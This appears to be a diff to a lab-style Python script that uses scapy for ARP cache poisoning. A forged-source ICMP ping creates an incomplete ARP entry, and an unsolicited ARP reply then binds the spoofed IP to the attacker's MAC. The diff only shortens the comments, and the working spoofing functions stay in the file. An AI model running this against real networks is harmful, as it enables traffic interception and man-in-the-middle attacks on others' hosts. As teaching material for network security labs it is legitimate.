@@ -20,17 +20,9 @@ Usage:
     sudo python3 arp_spoof.py reply <iface> <target_ip> <target_mac> <spoof_ip>
     sudo python3 arp_spoof.py both  <iface> <target_ip> <target_mac> <spoof_ip>
 
-`ping` and `reply` run just one half of the attack each, so you can run
-`arp -n` on the target in between and actually see the incomplete entry
-before it gets resolved. `both` runs the full sequence with a 1s pause,
-for convenience once you've already observed the two steps separately.
-
-Example (attacker poisons Host A's table so that 10.9.0.7 maps to the
-attacker's own MAC):
-    sudo python3 arp_spoof.py ping  br-abc123 10.9.0.5 02:42:0a:09:00:05 10.9.0.7
-    # now check `arp -n` on Host A -- 10.9.0.7 should show up as incomplete
-    sudo python3 arp_spoof.py reply br-abc123 10.9.0.5 02:42:0a:09:00:05 10.9.0.7
-    # now check `arp -n` on Host A again -- 10.9.0.7 should map to the attacker's MAC
+ping and reply run one step each so you can check `arp -n` on the target
+in between and see the incomplete entry before it gets resolved. both runs
+the whole thing with a 1s pause.
 """
 
 import sys
@@ -45,23 +37,15 @@ SLEEP_BETWEEN_PING_AND_REPLY = 1  # seconds
 
 
 def spoof_ping(iface, attacker_mac, target_mac, target_ip, spoof_ip):
-    """Send an ICMP echo request at layer 2 with a forged source IP.
-
-    This causes the target to notice a "new" IP address (spoof_ip) and
-    create an incomplete entry for it in its ARP table (it knows the IP
-    exists but not yet the MAC, since it hasn't seen an ARP reply).
-    """
+    """Send an ICMP echo with a forged source IP so the target opens an
+    incomplete ARP entry for spoof_ip (knows the IP, not yet the MAC)."""
     pkt = Ether(src=attacker_mac, dst=target_mac) / IP(src=spoof_ip, dst=target_ip) / ICMP()
     sendp(pkt, iface=iface, verbose=0)
 
 
 def spoof_arp_reply(iface, attacker_mac, target_mac, target_ip, spoof_ip):
-    """Send an unsolicited ARP reply claiming spoof_ip is-at attacker_mac.
-
-    Because ARP replies are not authenticated, the target will accept this
-    and update (or, per the incomplete entry from spoof_ping, complete)
-    its ARP table entry for spoof_ip to point at the attacker's MAC.
-    """
+    """Send an unsolicited ARP reply: spoof_ip is-at attacker_mac. ARP isn't
+    authenticated, so the target just caches it."""
     pkt = Ether(src=attacker_mac, dst=target_mac) / ARP(
         op=2,  # is-at (reply)
         hwsrc=attacker_mac,
@@ -74,10 +58,8 @@ def spoof_arp_reply(iface, attacker_mac, target_mac, target_ip, spoof_ip):
 
 def poison(iface, attacker_mac, target_mac, target_ip, spoof_ip, sleep_sec=SLEEP_BETWEEN_PING_AND_REPLY):
     spoof_ping(iface, attacker_mac, target_mac, target_ip, spoof_ip)
-    # The target only *updates* an existing ARP entry on a reply, it never
-    # creates one from a reply alone. The ping above must arrive first and
-    # be processed (creating the incomplete entry) before the reply below
-    # arrives, or the reply is silently ignored.
+    # ping has to land first: a reply only updates an existing entry, it
+    # won't create one, so without the sleep the reply gets dropped.
     time.sleep(sleep_sec)
     spoof_arp_reply(iface, attacker_mac, target_mac, target_ip, spoof_ip)
 
